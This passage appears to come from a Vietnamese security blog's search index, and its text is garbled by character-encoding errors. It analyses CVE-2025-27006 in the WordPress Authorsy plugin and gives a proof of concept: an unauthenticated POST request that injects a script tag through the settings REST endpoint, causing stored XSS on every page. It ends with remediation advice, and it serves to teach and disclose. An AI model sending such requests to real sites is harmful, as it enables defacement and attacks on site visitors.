ƒë·ªëi t∆∞·ª£ng WP_Error, nh∆∞ng kh√¥ng d·ª´ng ch∆∞∆°ng tr√¨nh. Trong update_settings, gi√° tr·ªã tr·∫£ v·ªÅ c·ªßa verify_nonce kh√¥ng ƒë∆∞·ª£c ki·ªÉm tra =\u0026gt; code v·∫´n ti·∫øp t·ª•c th·ª±c hi·ªán c·∫≠p nh·∫≠t. üëâ Nh∆∞ v·∫≠y, ta c√≥ th·ªÉ thay ƒë·ªëi gi√° tr·ªã c·ªßa CSS ch·ª©a XSS payload trong database m√† kh√¥ng c·∫ßn ƒë·∫∑c quy·ªÅn g√¨ c·∫£ =\u0026gt; CSS ƒë∆∞·ª£c th√™m v√†o \u0026lt;head\u0026gt; ch·ª©a m√£ ƒë·ªôc\nExploit Detect XSS G·ª≠i POST request ƒë·∫øn /wp-json/authorsy/v1/settings v·ªõi XSS payload\nPOST /wp-json/authorsy/v1/settings HTTP/1.1 Host: localhost Content-Type: application/json { \u0026#34;primary_color\u0026#34;:\u0026#34;\u0026lt;/style\u0026gt;\u0026lt;script\u0026gt;alert(document.domain)\u0026lt;/script\u0026gt;\u0026lt;style\u0026gt;\u0026#34; } Ta ƒë√≥ng th·∫ª \u0026lt;style\u0026gt; (CSS trong head) v√† inject th√™m th·∫ª \u0026lt;script\u0026gt; ch·ª©a XSS payload.\nTruy c·∫≠p m·ªôt trang b·∫•t k·ª≥\nüëâ XSS th√†nh c√¥ng, inspect ƒë·ªÉ xem code ƒë∆∞·ª£c thay ƒë·ªïi nh∆∞ n√†o\n\u0026lt;style\u0026gt; :root { --ea-color-main: \u0026lt;/style\u0026gt;\u0026lt;script\u0026gt;alert(document.domain)\u0026lt;/script\u0026gt;\u0026lt;style\u0026gt;; } \u0026lt;/style\u0026gt; Conclusion L·ªó h·ªïng CVE-2025-27006 trong plugin Authorsy \u0026lt;= 1.0.5 l√† m·ªôt v√≠ d·ª• ƒëi·ªÉn h√¨nh v·ªÅ Broken Access Control k·∫øt h·ª£p v·ªõi XSS. Nguy√™n nh√¢n ch√≠nh l√†:\nREST API kh√¥ng ki·ªÉm so√°t quy·ªÅn truy c·∫≠p: b·∫•t k·ª≥ user n√†o c≈©ng c√≥ th·ªÉ g·ªçi /wp-json/authorsy/v1/settings ƒë·ªÉ thay ƒë·ªïi c√°c option. CSS t√πy ch·ªânh ch∆∞a ƒë∆∞·ª£c sanitize: gi√° tr·ªã CSS ƒë∆∞·ª£c ch√®n tr·ª±c ti·∫øp v√†o \u0026lt;style\u0026gt; trong \u0026lt;head\u0026gt;, cho ph√©p k·∫ª t·∫•n c√¥ng inject payload \u0026lt;script\u0026gt; th√¥ng qua CSS. Nonce kh√¥ng ƒë∆∞·ª£c x·ª≠ l√Ω ƒë√∫ng: verify_nonce ch·ªâ tr·∫£ v·ªÅ WP_Error m√† kh√¥ng ngƒÉn code th·ª±c thi, khi·∫øn vi·ªác ki·ªÉm tra b·∫£o m·∫≠t g·∫ßn nh∆∞ v√¥ hi·ªáu. Key takeaways:\nREST API c·∫ßn ki·ªÉm so√°t quy·ªÅn: lu√¥n s·ª≠ d·ª•ng permission_callback h·ª£p l√Ω ƒë·ªÉ ngƒÉn Broken Access Control. Sanitize d·ªØ li·ªáu ng∆∞·ªùi d√πng tr∆∞·ªõc khi render trong HTML/CSS/JS ƒë·ªÉ ph√≤ng XSS. References Cross-site scripting (XSS) cheat sheet\nWordPress Authorsy Plugin \u0026lt;= 1.0.5 is vulnerable to Cross Site Scripting (XSS) ","permalink":"//localhost:1313/vi/posts/2025-09-17-cve-2025-27006/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eAuthorsy\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.0.6\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng ch√®n m√£ ƒë·ªôc (v√≠ d·ª•: script chuy·ªÉn h∆∞·ªõng, qu·∫£ng c√°o, ho·∫∑c c√°c payload HTML kh√°c) v√†o website, v√† nh·ªØng m√£ ƒë√≥ s·∫Ω ƒë∆∞·ª£c th·ª±c thi khi kh√°ch truy c·∫≠p m·ªü trang.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-27006\"\u003eCVE-2025-27006\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/authorsy/\"\u003eWordPress Authorsy Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: Cross Site Scripting\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.0.5\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: Medium (6.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eOWASP Top 10\u003c/strong\u003e: A1: Broken Access Control\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003eTrong m√¥ t·∫£ y√™u c·∫ßu ƒë·∫∑c quy·ªÅn \u003cstrong\u003eSubscriber\u003c/strong\u003e nh∆∞ng th·ª±c ra c√≥ th·ªÉ khai th√°c \u003cstrong\u003eUnauthenticated\u003c/strong\u003e.\n{: .prompt-info }\u003c/p\u003e","title":"CVE-2025-27006 Analysis \u0026 POC"}]